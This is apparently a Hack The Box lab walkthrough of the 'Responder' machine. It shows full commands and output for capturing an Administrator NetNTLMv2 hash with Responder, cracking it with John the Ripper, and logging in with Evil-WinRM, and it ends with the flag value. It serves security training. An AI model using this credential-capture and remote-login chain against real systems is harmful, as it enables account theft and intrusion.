---
layout: single
title: 'Responder'
excerpt: 'Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.'
date: 2026-06-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-responder/responder_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-1-Fundamental-Exploitation
os: Windows
difficulty: Very Easy
release: 2022-04-06
ip: 10.129.139.161
---

{% include info-card.html %}

## Tools

- [Responder](https://github.com/lgandx/Responder)
- [John the Ripper](https://github.com/openwall/john)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

## Task 1

![Task 1](/assets/images/htb-writeup-responder/Task 1.png)

With that in mind I have to add that domain to my `/etc/hosts` because it is doing Virtual Hosting.

![Virtual Hosting](/assets/images/htb-writeup-responder/virtual%20hosting.png)

## Web Site

![Web Site](/assets/images/htb-writeup-responder/Web%20site.png)

## Task 2

![Task 2](/assets/images/htb-writeup-responder/Task 2.png)

<pre class="language-"><code class="language-java">
❯ whatweb 10.129.139.161
http://10.129.139.161 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.139.161], Meta-Refresh-Redirect[http://unika.htb/], OpenSSL[1.1.1m], PHP[8.1.1], X-Powered-By[PHP/8.1.1]
http://unika.htb/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[info@unika.htb], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.139.161], JQuery[1.11.1], OpenSSL[1.1.1m], PHP[8.1.1], Script, Title[Unika], X-Powered-By[PHP/8.1.1], X-UA-Compatible[IE=edge]
</code></pre>

## Task 3

![Task 3](/assets/images/htb-writeup-responder/Task 3.png)

![URL Parameter](/assets/images/htb-writeup-responder/URL%20Parameter.png)

## Task 4

![Task 4](/assets/images/htb-writeup-responder/Task 4.png)

## Task 5

![Task 5](/assets/images/htb-writeup-responder/Task 5.png)

## Task 6

![Task 6](/assets/images/htb-writeup-responder/Task 6.png)

## Task 7

![Task 7](/assets/images/htb-writeup-responder/Task 7.png)

I can use [Responder](https://github.com/lgandx/Responder) and ran an SMB poisoning attack to capture an NTLMv2-SSP hash.

<pre class="language-"><code class="language-">
❯ python3 Responder.py -I tun0 -v
<span style="display: inline-block; line-height: 1; white-space: pre;">                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
</span>

[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [OFF]
    SQL server                 [ON]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.165]
    Responder IPv6             [fe80::194c:85aa:f015:c3e7]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-68B42RYZUH4]
    Responder Domain Name      [YQYF.LOCAL]
    Responder DCE-RPC Port     [46272]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.141.95
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : <span style="color: #bb66ff;">Administrator::RESPONDER:0043bced26a91f61:B4E0F89106C733C7FB686A342A031C43:0101000000000000006E274AC607DD01093DE57295AD10450000000002000800590051005900460001001E00570049004E002D0036003800420034003200520059005A0055004800340004003400570049004E002D0036003800420034003200520059005A005500480034002E0059005100590046002E004C004F00430041004C000300140059005100590046002E004C004F00430041004C000500140059005100590046002E004C004F00430041004C0007000800006E274AC607DD010600040002000000080030003000000000000000010000000020000088110D9E32BED06E241DD6893218667C260915F5D54FA5102DDC2D0BA5151F280A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360035000000000000000000</span>
</code></pre>

## Task 8

![Task 8](/assets/images/htb-writeup-responder/Task 8.png)

## Task 9

![Task 9](/assets/images/htb-writeup-responder/Task 9.png)

<pre class="language-"><code class="language-">
❯ john  -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Note: Passwords longer than 85 [worst case UTF-8] to 256 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<span style="color: #bb66ff;">badminton</span>        (<span style="color: #bb66ff;">Administrator</span>)     
1g 0:00:00:00 DONE (2026-06-29 04:59) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..total90
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
</code></pre>

## Task 10

![Task 10](/assets/images/htb-writeup-responder/Task 10.png)

<pre class="language-"><code class="language-">
❯ nmap -sCV -p80,5985 -oN targeted 10.129.139.161
  Nmap scan report for unika.htb (10.129.139.161)
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
<span style="color: #bb66ff;">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</code></pre>

I can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to try to connect to the machine

<pre class="language-"><code class="language-">
❯ evil-winrm -i 10.129.141.95 -u Administrator -p badminton -P 5985
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
<span style="color: #bb66ff;">*Evil-WinRM* PS C:\Users\Administrator\Documents> </span>
</code></pre>

## Task 11

![Task 11](/assets/images/htb-writeup-responder/Task 11.png)

<pre class="language-"><code class="language-">
*Evil-WinRM* PS C:\Users\mike\Desktop> ls


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> gc flag.txt
<span style="color: #bb66ff;">ea81b7afddd03efaa0945333ed147fac</span>
*Evil-WinRM* PS C:\Users\mike\Desktop> 
</code></pre>

## Submit Flag

![Task 12](/assets/images/htb-writeup-responder/Task%2012.png)

![You have solved Responder!](/assets/images/htb-writeup-responder/You%20have%20solved%20Responder!.png)
